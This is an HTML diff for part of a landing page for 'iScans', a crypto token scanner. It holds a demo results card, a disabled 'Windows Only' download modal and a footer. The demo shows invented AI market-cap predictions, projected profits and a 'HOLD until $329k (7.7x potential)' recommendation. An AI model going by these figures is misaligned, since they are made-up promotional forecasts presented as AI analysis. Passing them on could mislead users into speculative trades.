+                                        <div class="ai-metrics-grid">
+                                            <div class="ai-metric-card green">
+                                                <div class="ai-metric-label">Your Entry</div>
+                                                <div class="ai-metric-value">1.19 SOL</div>
+                                            </div>
+                                            <div class="ai-metric-card purple">
+                                                <div class="ai-metric-label">Bought at MC</div>
+                                                <div class="ai-metric-value">$43k</div>
+                                            </div>
+                                            <div class="ai-metric-card orange">
+                                                <div class="ai-metric-label">Current MC</div>
+                                                <div class="ai-metric-value">$115k</div>
+                                            </div>
+                                            <div class="ai-metric-card red">
+                                                <div class="ai-metric-label">AI MC Predict</div>
+                                                <div class="ai-metric-value">$329k</div>
+                                            </div>
+                                            <div class="ai-metric-card blue">
+                                                <div class="ai-metric-label">Current Profit</div>
+                                                <div class="ai-metric-value">+1.99 SOL</div>
+                                            </div>
+                                            <div class="ai-metric-card green">
+                                                <div class="ai-metric-label">Potential Profit</div>
+                                                <div class="ai-metric-value">+7.91 SOL</div>
+                                            </div>
+                                            <div class="ai-metric-card dual orange-green">
+                                                <div class="ai-metric-dual">
+                                                    <div class="ai-dual-top">
+                                                        <div class="ai-dual-label">Cluster</div>
+                                                        <div class="ai-dual-value orange-text">4</div>
+                                                    </div>
+                                                    <div class="ai-dual-line"></div>
+                                                    <div class="ai-dual-bottom">
+                                                        <div class="ai-dual-label">Supply</div>
+                                                        <div class="ai-dual-value green-text">7%</div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div class="ai-metric-card dual green-green">
+                                                <div class="ai-metric-dual">
+                                                    <div class="ai-dual-top">
+                                                        <div class="ai-dual-label">Risk</div>
+                                                        <div class="ai-dual-value green-text">6%</div>
+                                                    </div>
+                                                    <div class="ai-dual-line"></div>
+                                                    <div class="ai-dual-bottom">
+                                                        <div class="ai-dual-label">Verdict</div>
+                                                        <div class="ai-dual-value green-text">HOLD</div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        
+                                        <!-- AI Recommendation -->
+                                        <div class="ai-recommendation">
+                                            <p class="ai-rec-title">AI iScan Recommendation:</p>
+                                            <p class="ai-rec-text">Strong potential. HOLD until $329k (7.7x potential)</p>
+                                        </div>
+                                        
+                                        <button class="demo-share-btn" id="shareAIResultBtn">
+                                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                                <circle cx="18" cy="5" r="3"></circle>
+                                                <circle cx="6" cy="12" r="3"></circle>
+                                                <circle cx="18" cy="19" r="3"></circle>
+                                                <line x1="8.59" y1="13.51" x2="15.42" y2="17.49"></line>
+                                                <line x1="15.41" y1="6.51" x2="8.59" y2="10.49"></line>
+                                            </svg>
+                                            Share Result
+                                        </button>
+                                        
+                                        <button class="demo-close-btn" id="demoCloseBtn3">
+                                            Close Demo
+                                        </button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Navigation Dots -->
+                <div class="demo-navigation">
+                    <span class="demo-dot" data-step="1"></span>
+                    <span class="demo-dot" data-step="2"></span>
+                    <span class="demo-dot" data-step="3"></span>
+                    <span class="demo-dot" data-step="4"></span>
+                    <span class="demo-dot" data-step="4_5"></span>
+                    <span class="demo-dot" data-step="5"></span>
+                    <span class="demo-dot" data-step="6"></span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Windows Only Modal (Disabled) -->
+        <!-- <div id="windowsOnlyModal" class="modal">
+            <div class="modal-overlay"></div>
+            <div class="modal-content">
+                <button class="modal-close" id="closeModal">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <line x1="18" y1="6" x2="6" y2="18"/>
+                        <line x1="6" y1="6" x2="18" y2="18"/>
+                    </svg>
+                </button>
+                
+                <div class="modal-icon">
+                    <svg width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+                        <rect x="2" y="3" width="20" height="14" rx="2"/>
+                        <line x1="8" y1="21" x2="16" y2="21"/>
+                        <line x1="12" y1="17" x2="12" y2="21"/>
+                    </svg>
+                </div>
+                
+                <h2 class="modal-title">Windows Only Application</h2>
+                <p class="modal-description">
+                    iScan is currently available only for Windows operating system.
+                    To download and use the application, please open this website on your Windows PC.
+                </p>
+                
+                <div class="modal-url-box">
+                    <input type="text" id="siteUrl" class="modal-input" readonly value="">
+                    <button class="btn btn-gradient" id="copyUrlBtn">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
+                            <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
+                        </svg>
+                        Copy URL
+                    </button>
+                </div>
+                
+                <div class="modal-platforms">
+                    <div class="platform-badge disabled">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09l.01-.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
+                        </svg>
+                        <span>iOS</span>
+                    </div>
+                    <div class="platform-badge disabled">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M17.523 15.341c-.828 0-1.5-.672-1.5-1.5s.672-1.5 1.5-1.5 1.5.672 1.5 1.5-.672 1.5-1.5 1.5zm-11.046 0c-.828 0-1.5-.672-1.5-1.5s.672-1.5 1.5-1.5 1.5.672 1.5 1.5-.672 1.5-1.5 1.5zm11.405-6.844l1.997-3.46c.11-.19.045-.435-.145-.545-.19-.11-.435-.045-.545.145l-2.02 3.499c-1.505-.69-3.202-1.082-5.011-1.082-1.809 0-3.506.392-5.011 1.082l-2.02-3.499c-.11-.19-.355-.255-.545-.145-.19.11-.255.355-.145.545l1.997 3.46C2.455 9.99.002 13.494.002 17.591h24c0-4.097-2.453-7.601-6.12-9.094z"/>
+                        </svg>
+                        <span>Android</span>
+                    </div>
+                    <div class="platform-badge active">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M0 3.449L9.75 2.1v9.451H0m10.949-9.602L24 0v11.4H10.949M0 12.6h9.75v9.451L0 20.699M10.949 12.6H24V24l-12.9-1.801"/>
+                        </svg>
+                        <span>Windows</span>
+                    </div>
+                </div>
+            </div>
+        </div> -->
+
+        <!-- Footer -->
+        <footer class="footer">
+            <div class="container">
+                <div class="footer-content">
+                    <div class="footer-brand">
+                        <div class="logo">
+                            <svg class="logo-icon" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                                <circle cx="40" cy="40" r="25" stroke-width="6" fill="none"></circle>
+                                <line x1="58" y1="58" x2="80" y2="80" stroke-width="6"></line>
+                            </svg>
+                            <span class="logo-text">iScans</span>
+                        </div>
+                        <p class="footer-tagline">Your multi-chain portfolio companion</p>
+                    </div>
+                    <div class="footer-links">
+                        <div class="footer-column">
+                            <h4>Product</h4>
+                            <a href="#">Features</a>
+                            <a href="#">How it Works</a>
+                            <a href="#">Pricing</a>
+                        </div>
+                        <div class="footer-column">
+                            <h4>Community</h4>
+                            <a href="#">Twitter</a>
+                            <a href="#">Discord</a>
+                            <a href="#">Telegram</a>
+                        </div>
+                        <div class="footer-column">
+                            <h4>Resources</h4>
+                            <a href="#">Documentation</a>
+                            <a href="#">API</a>
+                            <a href="#">Support</a>
+                        </div>
+                    </div>
+                </div>
+                <div class="footer-bottom">
+                    <p>� 2025 iScans. All rights reserved.</p>
+                    <div class="footer-legal">
+                        <a href="#">Privacy Policy</a>
+                        <a href="#">Terms of Service</a>
+                    </div>
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <script src="js/script.js"></script>
+
+
+
+
+
+</body></html>
